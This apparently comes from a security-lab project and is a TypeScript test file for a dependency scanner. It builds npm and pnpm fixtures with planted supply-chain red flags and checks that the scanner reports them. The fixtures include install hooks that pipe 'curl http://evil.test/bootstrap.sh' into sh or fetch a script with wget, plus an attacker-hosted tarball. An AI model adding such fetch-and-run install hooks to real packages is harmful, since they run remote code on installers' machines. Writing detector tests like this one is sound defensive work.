import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runDependencyProbe } from './dependency-probe.js';

test('runDependencyProbe detects lockfile, script, provenance, and diff anomalies', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-dependency-probe-'));

  try {
    await mkdir(join(root, 'node_modules', 'sneaky-dep'), { recursive: true });
    await writeFile(
      join(root, 'package.json'),
      JSON.stringify(
        {
          name: 'dep-fixture',
          version: '1.0.0',
          dependencies: {
            'sneaky-dep': 'github:attacker/sneaky#main',
          },
          scripts: {
            postinstall: 'curl http://evil.test/bootstrap.sh | sh',
          },
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(
      join(root, 'node_modules', 'sneaky-dep', 'package.json'),
      JSON.stringify(
        {
          name: 'sneaky-dep',
          version: '1.0.0',
          scripts: {
            preinstall: 'wget http://evil.test/install.sh',
          },
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(
      join(root, 'package-lock.json'),
      JSON.stringify(
        {
          name: 'dep-fixture',
          packages: {
            'node_modules/sneaky-dep': {
              version: '1.0.0',
              resolved: 'https://malicious.example/sneaky-dep.tgz',
            },
          },
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(join(root, '.npmrc'), 'registry=https://mirror.example/\n', 'utf8');
    await writeFile(join(root, 'yarn.lock'), '# mixed tooling\n', 'utf8');

    const target = {
      kind: 'dependency' as const,
      id: 'dep-fixture',
      environment: 'sandbox',
      repoRoot: root,
    };

    const lockfile = await runDependencyProbe(
      { kind: 'dependency_read', action: 'inspect_lockfile', filePath: 'package-lock.json', timeoutMs: 1000 },
      target,
    );
    assert.equal(lockfile.exitCode, 1);
    assert.match(lockfile.stdout ?? '', /unusual-registry/i);
    assert.match(lockfile.stdout ?? '', /integrity-gap/i);

    const scripts = await runDependencyProbe(
      { kind: 'dependency_read', action: 'check_scripts', timeoutMs: 1000 },
      target,
    );
    assert.equal(scripts.exitCode, 1);
    assert.match(scripts.stdout ?? '', /risky-script/i);
    assert.match(scripts.stdout ?? '', /dep-risky-script/i);

    const provenance = await runDependencyProbe(
      { kind: 'dependency_read', action: 'scan_provenance', timeoutMs: 1000 },
      target,
    );
    assert.equal(provenance.exitCode, 1);
    assert.match(provenance.stdout ?? '', /custom-registry/i);
    assert.match(provenance.stdout ?? '', /mixed-lockfiles/i);

    const diff = await runDependencyProbe(
      {
        kind: 'dependency_read',
        action: 'diff_lockfile',
        filePath: 'package-lock.json',
        previousContent: JSON.stringify({
          packages: {
            'node_modules/sneaky-dep': { version: '0.9.0' },
            'node_modules/removed-dep': { version: '1.0.0' },
          },
        }),
        timeoutMs: 1000,
      },
      target,
    );
    assert.equal(diff.exitCode, 1);
    assert.match(diff.stdout ?? '', /~sneaky-dep: 0.9.0 → 1.0.0/);
    assert.match(diff.stdout ?? '', /-removed-dep/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});

test('runDependencyProbe auto-detects pnpm lockfiles and diffs them correctly', async () => {
  const root = await mkdtemp(join(tmpdir(), 'security-lab-dependency-probe-pnpm-'));

  try {
    await writeFile(
      join(root, 'package.json'),
      JSON.stringify(
        {
          name: 'pnpm-fixture',
          version: '1.0.0',
          packageManager: 'pnpm@10.0.0',
        },
        null,
        2,
      ),
      'utf8',
    );
    await writeFile(
      join(root, 'pnpm-lock.yaml'),
      `lockfileVersion: '9.0'
packages:
  safe-lib@2.0.0:
    resolution:
      integrity: sha512-safe
      tarball: https://mirror.example/safe-lib-2.0.0.tgz
  other-lib@1.0.0:
    resolution:
      tarball: https://registry.npmjs.org/other-lib/-/other-lib-1.0.0.tgz
`,
      'utf8',
    );

    const target = {
      kind: 'dependency' as const,
      id: 'pnpm-fixture',
      environment: 'sandbox',
      repoRoot: root,
    };

    const lockfile = await runDependencyProbe(
      { kind: 'dependency_read', action: 'inspect_lockfile', timeoutMs: 1000 },
      target,
    );
    assert.equal(lockfile.exitCode, 1);
    assert.match(lockfile.stdout ?? '', /unusual-registry/i);
    assert.match(lockfile.stdout ?? '', /integrity-gap/i);

    const diff = await runDependencyProbe(
      {
        kind: 'dependency_read',
        action: 'diff_lockfile',
        previousContent: `lockfileVersion: '9.0'
packages:
  safe-lib@1.0.0:
    resolution:
      integrity: sha512-safe
  removed-lib@1.0.0:
    resolution:
      integrity: sha512-removed
`,
        timeoutMs: 1000,
      },
      target,
    );
    assert.equal(diff.exitCode, 1);
    assert.match(diff.stdout ?? '', /~safe-lib: 1.0.0 → 2.0.0/);
    assert.match(diff.stdout ?? '', /-removed-lib/);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
});
